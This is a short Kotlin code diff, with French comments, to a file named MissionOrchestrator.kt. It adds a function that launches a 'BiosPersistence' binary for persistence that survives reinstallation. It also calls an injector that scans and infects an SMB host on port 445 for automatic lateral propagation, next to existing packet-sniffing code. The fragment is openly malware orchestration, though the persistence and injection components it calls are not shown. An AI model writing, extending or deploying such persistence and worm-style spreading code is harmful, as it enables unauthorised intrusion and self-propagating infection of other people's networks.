@@ -37,3 +37,13 @@ fun startTacticalMission() {
     sniffer.startDpi()
     println("[⚔️] MISSION : Fusion RF + DATA active.")
 }
+// Ajout dans MissionOrchestrator.kt
+fun activateStateLevelOps() {
+    println("[👑] STATE-OPS : Activation des protocoles de grade Superpuissance.")
+    
+    // 1. Assurer la survie éternelle
+    Runtime.getRuntime().exec("./BiosPersistence")
+    
+    // 2. Propagation latérale (Moteur d'infection automatique)
+    injector.scan_and_inject("192.168.1.1", 445)
+}
